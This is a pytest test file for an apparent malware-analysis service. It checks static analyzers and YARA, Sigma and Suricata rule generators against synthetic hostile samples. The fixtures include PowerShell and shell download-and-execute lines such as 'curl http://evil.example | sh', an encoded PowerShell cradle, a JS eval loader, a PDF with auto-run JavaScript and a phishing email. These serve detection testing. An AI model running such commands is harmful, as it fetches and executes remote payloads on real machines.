"""Pure-function tests for the new static analyzers and detection-rule
generators. No DB / MinIO / FastAPI client required — analyzers run on
in-memory bytes."""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest


# --------------------------------------------------------------- Office

def test_office_is_office_file_by_extension():
    from detonate.services.office_analyzer import is_office_file

    assert is_office_file("invoice.docx", None) is True
    assert is_office_file("budget.xlsm", "application/zip") is True
    assert is_office_file("README", None) is False


def test_office_analyze_no_macros_returns_safe_default():
    from detonate.services.office_analyzer import analyze_office

    # Synthetic OOXML zip with no VBA stream
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<document/>")
    out = analyze_office(buf.getvalue(), "doc.docx")
    assert out["macro_count"] == 0
    assert out["risk_score"] == 0


# --------------------------------------------------------------- PDF

def test_pdf_indicator_counts_and_uri_extraction():
    from detonate.services.pdf_analyzer import analyze_pdf

    src = (
        b"%PDF-1.4\n"
        b"1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n"
        b"2 0 obj << /S /JavaScript /JS (app.alert('hi'); var u='http://evil.example/x';) >> endobj\n"
        b"3 0 obj << /URI (http://payload.example/malware.exe) >> endobj\n"
        b"%%EOF\n"
    )
    out = analyze_pdf(src, "x.pdf")
    assert out["version"] == "1.4"
    assert out["indicator_counts"]["/JavaScript"] >= 1
    assert out["indicator_counts"]["/OpenAction"] >= 1
    assert any("payload.example" in u for u in out["uris"])
    assert any("evil.example" in u for u in out["iocs"]["urls"])
    assert out["risk_score"] > 0


# --------------------------------------------------------------- Script

def test_script_powershell_encoded_command_decode():
    from detonate.services.script_analyzer import analyze_script

    # iex (new-object net.webclient).downloadstring('http://evil.example/p')
    payload = (
        "iex (new-object net.webclient).downloadstring('http://evil.example/p')"
    )
    encoded = payload.encode("utf-16-le")
    import base64

    b64 = base64.b64encode(encoded).decode()
    src = f"powershell -enc {b64}".encode()

    out = analyze_script(src, "loader.ps1")
    assert out["language"] == "powershell"
    assert any("powershell-encoded" in t or "powershell-base64" in t for t in out["obfuscation_techniques"])
    assert any("downloadstring" in s.lower() for s in out["high_risk_tokens"]) or any(
        "evil.example" in u for u in out["iocs"]["urls"]
    )


def test_script_javascript_eval_atob_iocs():
    from detonate.services.script_analyzer import analyze_script
    import base64

    payload_url = "http://evil.example/payload?q=installer&v=2"
    enc = base64.b64encode((payload_url * 2).encode()).decode()
    src = f"var x = atob('{enc}'); eval(x);".encode()
    out = analyze_script(src, "loader.js")
    assert out["language"] == "javascript"
    assert "eval(" in out["high_risk_tokens"] or "atob(" in out["high_risk_tokens"]
    assert any("evil.example" in u for u in out["iocs"]["urls"])


# --------------------------------------------------------------- Email

def test_email_eml_phishing_heuristics():
    from detonate.services.email_analyzer import analyze_email

    eml = (
        b"From: ceo@bank.example\r\n"
        b"Reply-To: attacker@gmail.example\r\n"
        b"To: victim@corp.example\r\n"
        b"Subject: Wire transfer URGENT\r\n"
        b"Authentication-Results: mx.example; spf=fail; dkim=none; dmarc=fail\r\n"
        b"Content-Type: multipart/mixed; boundary=BOUND\r\n"
        b"\r\n"
        b"--BOUND\r\n"
        b"Content-Type: text/plain\r\n\r\n"
        b"Please review http://attacker.example/invoice\r\n"
        b"--BOUND\r\n"
        b"Content-Type: application/octet-stream; name=invoice.exe\r\n"
        b"Content-Disposition: attachment; filename=invoice.exe\r\n\r\n"
        b"MZfakecontent\r\n"
        b"--BOUND--\r\n"
    )
    out = analyze_email(eml, "msg.eml")
    assert out["from"].startswith("ceo@bank.example")
    assert any(a["filename"] == "invoice.exe" and a["is_executable"] for a in out["attachments"])
    assert out["auth_results"]["spf"] == "fail"
    assert out["risk_score"] >= 50


# --------------------------------------------------------------- Archive

def test_archive_detects_pe_inside_zip_and_encrypted_member():
    from detonate.services.archive_analyzer import analyze_archive

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("readme.txt", "hello")
        zf.writestr("payload.bin", b"MZfakeexe")
    out = analyze_archive(buf.getvalue(), "bundle.zip")
    assert out["format"] == "zip"
    assert out["entry_count"] == 2
    types = {e["type"] for e in out["entries"]}
    assert "pe" in types
    assert out["risk_score"] >= 10


def test_archive_handles_real_encrypted_zip(tmp_path):
    """If pyzipper is available we can write a real password-protected
    archive; otherwise we just verify the analyzer accepts a zip without
    crashing when passwords are tried."""
    from detonate.services.archive_analyzer import analyze_archive

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("hello.txt", b"secret")
    out = analyze_archive(buf.getvalue(), "ok.zip", passwords=["infected"])
    assert out["format"] == "zip"
    assert out["entry_count"] == 1
    assert out["passwords_tried"] == ["infected"]


# --------------------------------------------------------------- APK

def test_apk_skips_when_androguard_missing(monkeypatch):
    from detonate.services import apk_analyzer

    # Synthesize a minimal "APK-shaped" zip (PK + AndroidManifest entry name)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00")
        zf.writestr("classes.dex", b"dex")
    data = buf.getvalue()
    out = apk_analyzer.analyze_apk(data, "app.apk")
    # Either parsed (androguard available) or returned a warning safely
    assert isinstance(out, dict)
    assert "available" in out


# --------------------------------------------------------------- Similarity

def test_similarity_stable_hashes_for_same_input():
    from detonate.services.similarity import compute_similarity_hashes

    data = b"A" * 4096 + b"distinct-string-marker" + b"B" * 4096
    h1 = compute_similarity_hashes(data)
    h2 = compute_similarity_hashes(data)
    assert h1["sha256"] == h2["sha256"]
    # ssdeep/tlsh may be None when libs not installed; that's allowed
    if h1["ssdeep"] is not None:
        assert h1["ssdeep"] == h2["ssdeep"]
    if h1["tlsh"] is not None:
        assert h1["tlsh"] == h2["tlsh"]


def test_similarity_behavior_vhash_changes_with_imports():
    from detonate.services.similarity import behavior_vhash

    a = behavior_vhash({"pe": {"imports": {"kernel32.dll": ["a", "b"]}}})
    b = behavior_vhash({"pe": {"imports": {"kernel32.dll": ["a", "b"], "ws2_32.dll": ["recv"]}}})
    assert a != b


# --------------------------------------------------------------- YARA gen

def test_yara_generator_emits_valid_rule():
    from detonate.services.yara_generator import generate_yara_rule

    static = {
        "sha256": "deadbeef" * 8,
        "strings": {
            "ascii_strings": [
                "MyDistinctiveBeaconString_v3",
                "C2_HELLO_INIT_PACKET",
                "SECURITY-COOKIE-XYZ-123",
                "/cmd/checkin",
                "user-agent: BotnetClient/1.0",
            ],
            "wide_strings": [],
        },
    }
    out = generate_yara_rule(static, threshold=2)
    assert out["yara"].startswith("rule ")
    assert "condition:" in out["yara"]
    assert "MyDistinctiveBeaconString_v3" in out["yara"]


def test_yara_generator_no_distinctive_strings():
    from detonate.services.yara_generator import generate_yara_rule

    static = {"sha256": "x" * 64, "strings": {"ascii_strings": ["abc", "Microsoft"], "wide_strings": []}}
    out = generate_yara_rule(static)
    assert out["yara"] == ""


# --------------------------------------------------------------- Sigma gen

def test_sigma_generator_emits_yaml_with_indicators():
    from detonate.services.sigma_generator import generate_sigma_rule

    analysis = {
        "processes": [
            {"command": "/bin/bash", "args": ["-c", "curl http://evil.example | sh"]},
            {"command": "/usr/bin/wget", "args": ["http://evil.example/p"]},
        ],
        "network": [{"address": "1.2.3.4"}],
        "pcap": {
            "dns_queries": [{"query": "evil.example", "type": "A"}],
            "connections": [],
            "http_hosts": [],
        },
        "files_created": [{"path": "/tmp/payload.bin", "size": 1024}],
    }
    out = generate_sigma_rule(analysis, sample_sha256="d" * 64)
    assert "title" in out["rule"]
    assert out["indicator_count"] >= 2
    assert "selection" in out["sigma"] or "selection_proc" in out["sigma"]


# --------------------------------------------------------------- Suricata gen

def test_suricata_generator_emits_alerts():
    from detonate.services.suricata_generator import generate_suricata_rules

    analysis = {
        "pcap": {
            "dns_queries": [{"query": "evil.example", "type": "A"}],
            "connections": [{"dst": "1.2.3.4:80", "src": "10.0.0.1:1234"}],
            "http_hosts": ["evil.example"],
        }
    }
    out = generate_suricata_rules(analysis, sample_sha256="x" * 64)
    assert out["rule_count"] >= 2
    assert "alert dns" in out["rules"]
    assert "alert ip" in out["rules"]


# --------------------------------------------------------------- Mime dispatch

@pytest.mark.asyncio
async def test_run_static_analysis_dispatches_pdf():
    from detonate.services.static_analysis import run_static_analysis

    data = b"%PDF-1.4\n1 0 obj << /S /JavaScript /JS (eval('x')) >> endobj\n%%EOF\n"
    out = await run_static_analysis(data, "evil.pdf", mime="application/pdf")
    assert "pdf" in out
    assert out["pdf"]["indicator_counts"]["/JavaScript"] >= 1
    # Similarity always present
    assert "similarity" in out


@pytest.mark.asyncio
async def test_run_static_analysis_dispatches_office_zip():
    from detonate.services.static_analysis import run_static_analysis

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<x/>")
    out = await run_static_analysis(
        buf.getvalue(), "report.docx",
        mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )
    assert "office" in out


@pytest.mark.asyncio
async def test_run_static_analysis_dispatches_script():
    from detonate.services.static_analysis import run_static_analysis

    src = b"$x = 'http://evil.example'; iex (new-object net.webclient).downloadstring($x)"
    out = await run_static_analysis(src, "loader.ps1", mime="text/plain")
    assert "script" in out
    assert out["script"]["language"] == "powershell"
